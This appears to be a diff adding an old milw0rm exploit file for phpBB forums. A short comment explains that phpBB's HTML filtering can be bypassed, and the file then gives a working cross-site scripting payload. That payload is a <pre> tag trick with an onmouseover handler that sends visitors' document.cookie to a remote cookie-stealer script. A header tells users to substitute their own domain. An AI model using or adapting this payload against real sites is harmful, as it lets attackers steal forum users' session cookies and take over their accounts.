@@ -1,0 +1,23 @@
+# to be used with cookie stealer located here: http://www.milw0rm.com/id.php?id=1103
+# Make sure you change www.milw0rm.com to your domain. thnx. /str0ke
+# Author: threesixthousan 
+
+/*
+As long as html is ON in the latest version of phpBB forums, 
+several XSS attack vectors are possible. phpBB incorrectly 
+filters in both messages and profiles, making cookie stealing, 
+and other XSS attacks possible. the exploit leads to arbitary 
+javascript execution, which in turn can lead to html defacement.
+
+use of the <pre> tag means that the cursor must pass it in the y 
+direction only. e.g. the mouse only needs to cross a point 
+horrizontaly equal to the link in order for the javascript to be executed.
+
+the following is a simple attack:
+*/
+
+<pre a='>' onmouseover='document.location="http://www.milw0rm.com/cookie_stealer.php?c="+document.cookie' b='<pre' >
+
+[url]http://www.somesite.com/[/url]</pre>
+
+# milw0rm.com [2006-01-29]
